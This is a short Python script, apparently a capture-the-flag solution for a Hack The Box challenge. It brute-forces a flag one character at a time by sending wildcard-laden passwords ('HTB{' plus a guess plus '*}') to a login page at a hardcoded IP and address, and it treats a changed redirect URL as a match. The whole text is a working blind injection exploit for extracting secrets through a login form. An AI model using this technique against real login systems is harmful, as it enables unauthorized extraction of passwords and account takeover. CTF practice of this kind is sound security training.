# Import the requests module
import requests

# Import the string module
import string

# Set a user agent header for the request
headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}

# Set the URL to the login page
url = "http://188.166.150.33:31360/login"

# Set the characters to be used for the password
chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

# Set the initial counter and flag values
counter = 0
flag = "HTB{"

# Start an infinite loop
while True:
    # If all characters have been tried, print the flag and exit the loop
    if counter == len(chars):
        print(flag + "}")
        break

    # Create a password to try
    password = flag + chars[counter] + "*}"

    # Print the password being tried
    print("Trying: " + password)

    # Set the username and password data for the request
    data = {"username" : "Reese", "password" : password}

    # Send a POST request to the login page with the user agent header and the username and password data
    response = requests.post(url, headers=headers, data=data)

    # If the URL changes after the request (indicating successful login), append the character to the flag and reset the counter to 0
    if (response.url != url + "?message=Authentication%20failed"):
        # Append the character to the flag
        flag += chars[counter]

        # Reset the counter to 0
        counter = 0
    else:
        # If the URL doesn't change, increment the counter to try the next character
        counter += 1
